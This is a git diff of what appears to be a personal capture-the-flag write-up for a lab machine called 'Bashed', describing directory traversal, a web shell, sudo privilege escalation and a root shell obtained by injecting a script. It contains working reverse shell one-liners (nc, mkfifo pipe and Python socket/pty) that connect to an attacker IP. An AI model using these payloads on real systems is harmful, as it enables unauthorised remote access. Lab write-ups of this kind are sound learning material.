@@ -18,8 +18,13 @@
 * I was able to open `/php` and it did not include anything but `sendMail.php` but if I was able to open it doesn't that mean that I have Directory Traversal vulnerability. 
 * I think I do have directory traversal.
 * Found a `/dev` directory through gobuster and since I have directory traversal I was able to view the directory and find that `phpbash.php` is stored there.
-
-nc -e /bin/sh 10.10.14.72 1234
+* I had the ability to `sudo` any command of the user `scriptmanager` so it was really simple to just `sudo /bin/bash` and this way I got this user
+```
+User www-data may run the following commands on bashed:
+    (scriptmanager : scriptmanager) NOPASSWD: ALL
+```  
+* To get the root I was able to edit a script that the root ran with the command `python` which left me no choice but to inject a rev shell inside this script and wait for the root to execute it and then BOOM I'm root.  
+* One of the easiest machines I solved so far.
 
 <br/><br/>
 
@@ -58,8 +63,7 @@ nc -e /bin/sh 10.10.14.72 1234
 rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.72 1234 >/tmp/f  
 
 
-User www-data may run the following commands on bashed:
-    (scriptmanager : scriptmanager) NOPASSWD: ALL
+
 
 
 import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.72",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
